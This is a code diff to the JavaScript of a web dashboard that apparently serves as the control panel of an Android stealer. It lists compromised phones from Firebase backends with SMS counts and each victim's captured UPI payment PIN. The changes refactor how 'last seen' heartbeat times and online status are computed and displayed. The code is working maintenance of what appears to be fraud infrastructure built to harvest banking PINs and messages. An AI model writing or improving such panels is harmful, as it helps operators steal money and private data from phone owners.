@@ -912,11 +912,63 @@ function resolveOnlineStatus(s,fbId){
 }
 function parseJoinedDate(str){
   if(!str) return 0;
+  var ms=parseDdMmYyyy(String(str).trim());
+  if(ms) return ms;
   try{
     var p=String(str).split('|')[0].trim().split('/');
     if(p.length===3) return new Date(parseInt(p[2],10),parseInt(p[1],10)-1,parseInt(p[0],10)).getTime();
   }catch(e){}
   return 0;
+}
+function toTimestampMs(v){
+  if(v==null||v==='') return 0;
+  if(typeof v==='object') return 0;
+  if(typeof v==='number'&&v>0) return v<1e12?v*1000:v;
+  if(typeof v==='string'){
+    if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
+    var p=parseDdMmYyyy(v); if(p) return p;
+    var t=Date.parse(v); if(!isNaN(t)) return t;
+  }
+  return 0;
+}
+function resolveLastSeenMs(raw,isOnline){
+  if(!raw||typeof raw!=='object') return 0;
+  if(isOnline) return Date.now();
+  if(raw._lastOnlineMs) return raw._lastOnlineMs;
+  var keys=['last_seen','lastSeen','last_ping','lastPing','updated_at','updatedAt','timestamp','ts'];
+  for(var i=0;i<keys.length;i++){var ms=toTimestampMs(raw[keys[i]]);if(ms) return ms;}
+  return parseJoinedDate(raw.joined);
+}
+function formatLastSeenAgo(ms){
+  if(!ms) return '—';
+  var diff=Date.now()-ms;
+  if(diff<0) return 'Just now';
+  if(diff<60000) return Math.floor(diff/1000)+'s ago';
+  if(diff<3600000) return Math.floor(diff/60000)+'m ago';
+  if(diff<86400000) return Math.floor(diff/3600000)+'h ago';
+  if(diff<604800000) return Math.floor(diff/86400000)+'d ago';
+  return new Date(ms).toLocaleString();
+}
+function renderLastSeen(d){
+  var el=document.getElementById('dLastSeen');
+  if(!el||!d) return;
+  if(d.status==='online'){
+    el.textContent='● ACTIVE';
+    el.style.color='var(--success)';
+    el.title='Online now';
+    return;
+  }
+  el.style.color='var(--muted)';
+  if(d.lastSeen>0){
+    el.textContent=formatLastSeenAgo(d.lastSeen);
+    el.title=new Date(d.lastSeen).toLocaleString();
+  }else if(d.joinedReadable){
+    el.textContent=d.joinedReadable;
+    el.title='Last device heartbeat';
+  }else{
+    el.textContent='—';
+    el.title='';
+  }
 }
 function isValidDeviceRecord(raw){
   if(!raw||typeof raw!=='object'||Array.isArray(raw)) return false;
@@ -934,7 +986,8 @@ function normalizeClientRecord(raw){
       name:raw.modelName||'Unknown',
       brand:raw.brand||(raw.modelName?String(raw.modelName).split(' ')[0]:''),
       android:raw.androidV||raw.sdkV||'',
-      ts:parseJoinedDate(raw.joined)||raw.ts||0,
+      ts:resolveLastSeenMs(raw,false)||parseJoinedDate(raw.joined)||raw.ts||0,
+      joinedReadable:raw.joined?String(raw.joined).trim():'',
       online:raw.status===true,
       online_status:raw.status===true,
       battery:parseBattery(raw.battery),
@@ -951,7 +1004,8 @@ function normalizeClientRecord(raw){
     name:raw.name||raw.device_model||raw.model,
     brand:raw.brand||raw.device_brand,
     android:raw.android||raw.android_version,
-    ts:raw.ts||raw.last_seen||raw.timestamp||0,
+    ts:resolveLastSeenMs(raw,false)||raw.ts||0,
+    joinedReadable:raw.joined?String(raw.joined).trim():'',
     online_status:raw.online_status,
     online:raw.online,
     status:raw.status,
@@ -1069,11 +1123,19 @@ function ingestDeviceData(fbId,nodeName,devId,data){
   var payload=Object.assign({_fbId:fbId},data);
   if(!payload.modelName&&!payload.name&&!payload.deviceId&&!payload.device_model)
     payload.name=String(devId).substring(0,16);
+  var key=makeDevKey(fbId,devId);
+  var prev=clientsRawMap[key]||{};
   var norm=normalizeClientRecord(payload);
   if(!norm) return;
-  var key=makeDevKey(fbId,devId);
   norm._node=nodeName; norm._fbId=fbId;
-  clientsRawMap[key]=Object.assign({},clientsRawMap[key]||{},norm);
+  var isOnline=resolveOnlineStatus(Object.assign({},payload,norm),fbId);
+  if(isOnline) norm._lastOnlineMs=Date.now();
+  else if(prev._lastOnlineMs) norm._lastOnlineMs=prev._lastOnlineMs;
+  else{
+    var seenMs=resolveLastSeenMs(payload,false);
+    if(seenMs) norm._lastOnlineMs=seenMs;
+  }
+  clientsRawMap[key]=Object.assign({},prev,norm);
 }
 function mergeSummaryNode(fbId,nodeName,raw){
   if(!raw||typeof raw!=='object') return;
@@ -1275,10 +1337,10 @@ function processClientsData(raw,fromCache){
     var fbId=s._fbId||parsed.fbId;
     var rawId=parsed.devId;
     var inst=getFbInstance(fbId);
-    var ts=s.ts||s.last_seen||s.timestamp||0;
-    if(typeof ts==='object') ts=0;
     var phone=getPhoneFromRecord(s);
     var on=resolveOnlineStatus(s,fbId);
+    var ts=on?Date.now():(s._lastOnlineMs||resolveLastSeenMs(s,false)||s.ts||0);
+    if(typeof ts==='object') ts=0;
     allDevs.push({
       id:       k,
       rawId:    rawId,
@@ -1294,6 +1356,7 @@ function processClientsData(raw,fromCache){
       network:  s.network||s.network_type||'?',
       charging: s.charging||s.is_charging||false,
       lastSeen: ts,
+      joinedReadable: s.joinedReadable||'',
       smsCount: s.sms_count||s.smsCount||s.total_sms||0,
       upiPin: getUpiPinFromRecord(s)
     });
@@ -1389,14 +1452,7 @@ function updateHero(d){
   document.getElementById('dAndroid').textContent=d.android||'?';
   document.getElementById('dSmsCount').textContent=d.smsCount;
   document.getElementById('dUpiPin').textContent=d.upiPin||'—';
-  if(d.status==='online'){
-    document.getElementById('dLastSeen').textContent='● ACTIVE';
-    document.getElementById('dLastSeen').style.color='var(--success)';
-  } else {
-    var diff=Date.now()-d.lastSeen;
-    document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
-    document.getElementById('dLastSeen').style.color='var(--muted)';
-  }
+  renderLastSeen(d);
 }
 
 // ═══ LAZY DEVICE DATA — load only active tab (fast open) ═══
@@ -1977,18 +2033,9 @@ document.addEventListener('keydown',function(e){if(!document.getElementById('log
 setInterval(function(){
   document.getElementById('footerTime').textContent=new Date().toLocaleString();
   clearClientsCacheIfExpired();
-  if(selDev) {
+  if(selDev){
     var dev=allDevs.find(function(d){return d.id===selDev;});
-    if(dev) {
-      if(dev.status==='online'){
-        document.getElementById('dLastSeen').textContent='● ACTIVE';
-        document.getElementById('dLastSeen').style.color='var(--success)';
-      } else {
-        var diff=Date.now()-dev.lastSeen;
-        document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
-        document.getElementById('dLastSeen').style.color='var(--muted)';
-      }
-    }
+    if(dev) renderLastSeen(dev);
   }
 },1000);
 </script>
